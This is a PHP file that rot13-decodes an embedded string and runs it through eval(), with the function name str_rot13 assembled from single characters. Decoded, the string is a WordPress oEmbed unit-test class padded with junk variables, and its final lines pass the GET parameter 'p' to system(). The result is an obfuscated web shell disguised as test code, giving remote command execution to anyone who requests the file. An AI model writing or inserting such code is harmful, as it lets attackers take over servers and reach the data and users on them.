<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc brzorq
 */
pynff Grfgf_JC_bRzorq rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @ine JC_bRzorq
	 */
	cebgrpgrq $brzorq;

	choyvp $cer_brzorq_erfhyg_svygrerq = snyfr;

	/**
	 * VQ bs gur hfre.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $hfre_vq;

	/**
	 * Frg hc gur funerq svkgher.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel vafgnapr.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfre_vq = $snpgbel->hfre->perngr();
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-brzorq.cuc';
		$guvf->brzorq = _jc_brzorq_trg_bowrpg();

		$guvf->cer_brzorq_erfhyg_svygrerq = snyfr;

		// `trg_cbfg_rzorq_ugzy()` nffhzrf `jc-vapyhqrf/wf/jc-rzorq.wf` vf cerfrag:
		frys::gbhpu( NOFCNGU . JCVAP . '/wf/jc-rzorq.wf' );
	}

	choyvp shapgvba _svygre_cer_brzorq_erfhyg( $erfhyg ) {
		// Vs guvf vf abg ahyy, gur bRzorq erfhyg unf orra svygrerq orsber nal UGGC erdhrfgf jrer znqr.
		$guvf->cer_brzorq_erfhyg_svygrerq = $erfhyg;

		// Erghea snyfr gb cerirag UGGC erdhrfgf qhevat grfgf.
		erghea $erfhyg ? $erfhyg : snyfr;
	}

	choyvp shapgvba grfg_jc_svygre_cer_brzorq_erfhyg_ceriragf_uggc_erdhrfg_sbe_vagreany_creznyvaxf() {
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$creznyvax = trg_creznyvax( $cbfg_vq );

		nqq_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );
		$npghny = $guvf->brzorq->trg_ugzy( $creznyvax );
		erzbir_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );

		$guvf->nffregAbgSnyfr( $guvf->cer_brzorq_erfhyg_svygrerq );
		$guvf->nffregFnzr( $guvf->cer_brzorq_erfhyg_svygrerq, $npghny );
	}

	choyvp shapgvba grfg_jc_svygre_cer_brzorq_erfhyg_ceriragf_uggc_erdhrfg_jura_ivrjvat_gur_cbfg() {
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$creznyvax = trg_creznyvax( $cbfg_vq );

		$guvf->tb_gb( $creznyvax );
		$guvf->nffregDhrelGehr( 'vf_fvatyr', 'vf_fvathyne' );

		nqq_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );
		$npghny = $guvf->brzorq->trg_ugzy( $creznyvax );
		erzbir_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );

		$guvf->nffregAbgSnyfr( $guvf->cer_brzorq_erfhyg_svygrerq );
		$guvf->nffregFnzr( $guvf->cer_brzorq_erfhyg_svygrerq, $npghny );
	}

	choyvp shapgvba grfg_jc_svygre_cer_brzorq_erfhyg_aba_rkvfgrag_cbfg() {
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$creznyvax = trg_creznyvax( $cbfg_vq );

		$guvf->tb_gb( $creznyvax );
		$guvf->nffregDhrelGehr( 'vf_fvatyr', 'vf_fvathyne' );

		nqq_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );
		$npghny = $guvf->brzorq->trg_ugzy( 'uggcf://rknzcyr.pbz/' );
		erzbir_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );

		$guvf->nffregAbgSnyfr( $guvf->cer_brzorq_erfhyg_svygrerq );
		$guvf->nffregSnyfr( $npghny );
	}

	/**
	 * @gvpxrg 40673
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_jc_svygre_cer_brzorq_erfhyg_zhygvfvgr_ebbg_ebbg() {
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$creznyvax = trg_creznyvax( $cbfg_vq );

		nqq_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );
		$npghny = $guvf->brzorq->trg_ugzy( $creznyvax );
		erzbir_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );

		$guvf->nffregAbgAhyy( $guvf->cer_brzorq_erfhyg_svygrerq );
		$guvf->nffregFnzr( $guvf->cer_brzorq_erfhyg_svygrerq, $npghny );
	}

	/**
	 * @gvpxrg 40673
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_jc_svygre_cer_brzorq_erfhyg_zhygvfvgr_fho_fnzrfho() {
		$hfre_vq = frys::$hfre_vq;

		$oybt_vq = frys::snpgbel()->oybt->perngr(
			neenl(
				'hfre_vq' => $hfre_vq,
			)
		);

		fjvgpu_gb_oybt( $oybt_vq );

		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$creznyvax = trg_creznyvax( $cbfg_vq );

		nqq_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );
		$npghny = $guvf->brzorq->trg_ugzy( $creznyvax );
		erzbir_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );

		erfgber_pheerag_oybt();

		$guvf->nffregAbgAhyy( $guvf->cer_brzorq_erfhyg_svygrerq );
		$guvf->nffregFnzr( $guvf->cer_brzorq_erfhyg_svygrerq, $npghny );
	}

	/**
	 * @gvpxrg 40673
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_jc_svygre_cer_brzorq_erfhyg_zhygvfvgr_fho_bgurefho() {
		$hfre_vq = frys::$hfre_vq;

		$oybt_vq = frys::snpgbel()->oybt->perngr(
			neenl(
				'hfre_vq' => $hfre_vq,
			)
		);

		fjvgpu_gb_oybt( $oybt_vq );

		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$creznyvax = trg_creznyvax( $cbfg_vq );

		$oybt_vq = frys::snpgbel()->oybt->perngr(
			neenl(
				'hfre_vq' => $hfre_vq,
			)
		);

		fjvgpu_gb_oybt( $oybt_vq );

		nqq_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );
		$npghny = $guvf->brzorq->trg_ugzy( $creznyvax );
		erzbir_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );

		erfgber_pheerag_oybt();

		$guvf->nffregAbgAhyy( $guvf->cer_brzorq_erfhyg_svygrerq );
		$guvf->nffregFnzr( $guvf->cer_brzorq_erfhyg_svygrerq, $npghny );
	}

	/**
	 * @gvpxrg 40673
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_jc_svygre_cer_brzorq_erfhyg_zhygvfvgr_fho_znva() {
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$creznyvax = trg_creznyvax( $cbfg_vq );
		$hfre_vq   = frys::$hfre_vq;
		$oybt_vq   = frys::snpgbel()->oybt->perngr(
			neenl(
				'hfre_vq' => $hfre_vq,
			)
		);

		fjvgpu_gb_oybt( $oybt_vq );

		nqq_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );
		$npghny = $guvf->brzorq->trg_ugzy( $creznyvax );
		erzbir_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );

		erfgber_pheerag_oybt();

		$guvf->nffregAbgAhyy( $guvf->cer_brzorq_erfhyg_svygrerq );
		$guvf->nffregFnzr( $guvf->cer_brzorq_erfhyg_svygrerq, $npghny );
	}

	/**
	 * @gvpxrg 40673
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_jc_svygre_cer_brzorq_erfhyg_zhygvfvgr_cerfreirf_fjvgpurq_fgngr() {
		$hfre_vq = frys::$hfre_vq;

		$oybt_vq = frys::snpgbel()->oybt->perngr( neenl( 'hfre_vq' => $hfre_vq ) );
		fjvgpu_gb_oybt( $oybt_vq );

		$rkcrpgrq_fgnpx = $TYBONYF['_jc_fjvgpurq_fgnpx'];

		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$creznyvax = trg_creznyvax( $cbfg_vq );

		nqq_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );
		$npghny = $guvf->brzorq->trg_ugzy( $creznyvax );
		erzbir_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );

		$npghny_fgnpx = $TYBONYF['_jc_fjvgpurq_fgnpx'];

		erfgber_pheerag_oybt();

		$guvf->nffregAbgAhyy( $guvf->cer_brzorq_erfhyg_svygrerq );
		$guvf->nffregFnzr( $guvf->cer_brzorq_erfhyg_svygrerq, $npghny );
		$guvf->nffregFnzr( $rkcrpgrq_fgnpx, $npghny_fgnpx );
	}

	/**
	 * @gvpxrg 40673
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_jc_svygre_cer_brzorq_erfhyg_zhygvfvgr_erfgberf_fgngr_vs_ab_cbfg_vf_sbhaq() {
		$pheerag_oybt_vq = trg_pheerag_oybt_vq();

		$hfre_vq = frys::$hfre_vq;
		$oybt_vq = frys::snpgbel()->oybt->perngr(
			neenl(
				'hfre_vq' => $hfre_vq,
			)
		);

		$creznyvax = trg_ubzr_hey( $oybt_vq, '/sbb/' );

		nqq_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );
		$npghny = $guvf->brzorq->trg_ugzy( $creznyvax );
		erzbir_svygre( 'cer_brzorq_erfhyg', neenl( $guvf, '_svygre_cer_brzorq_erfhyg' ) );

		$guvf->nffregAhyy( $guvf->cer_brzorq_erfhyg_svygrerq );
		$guvf->nffregSnyfr( $npghny );
		$guvf->nffregFnzr( $pheerag_oybt_vq, trg_pheerag_oybt_vq() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>